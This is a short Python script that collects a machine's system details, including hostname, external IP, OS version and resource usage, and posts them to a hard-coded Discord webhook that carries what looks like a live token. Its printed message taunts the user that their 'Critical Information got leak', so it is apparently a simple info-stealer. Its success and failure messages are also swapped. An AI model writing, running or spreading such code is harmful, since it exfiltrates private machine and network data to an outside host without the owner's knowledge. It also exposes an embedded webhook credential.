import os
import platform
import socket
import psutil
import requests
import datetime

def get_system_info():
    system_info = {
        "Operating System": platform.system(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Python Version": platform.python_version(),
        "Hostname": socket.gethostname(),
        "External IP": requests.get('https://api.ipify.org').text,
        "CPU Usage": psutil.cpu_percent(interval=1),
        "Memory Usage": psutil.virtual_memory().percent,
        "Disk Usage": psutil.disk_usage('/').percent,
        "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
    }
    return system_info

def send_discord_message(webhook_url, message):
    payload = {"content": message}
    response = requests.post(webhook_url, json=payload)
    return response.status_code == 200

def main():
    webhook_url = "https://discord.com/api/webhooks/[ID]/fCOxCcvhEG5VeFPiTCWg-8MxDQYitl1WfJjqmIsHReeJNZEkC3nQwu4OHsEVUxEZi9Qn"
    system_info = get_system_info()
    message = f"System Information:\n{system_info}\nCurrent date and time: {datetime.datetime.now()}"

    if send_discord_message(webhook_url, message):
        print("Failed to send webhook message")
    else:
        print("Your Critical Information got leak & Send LAMAO")

if __name__ == "__main__":
    main()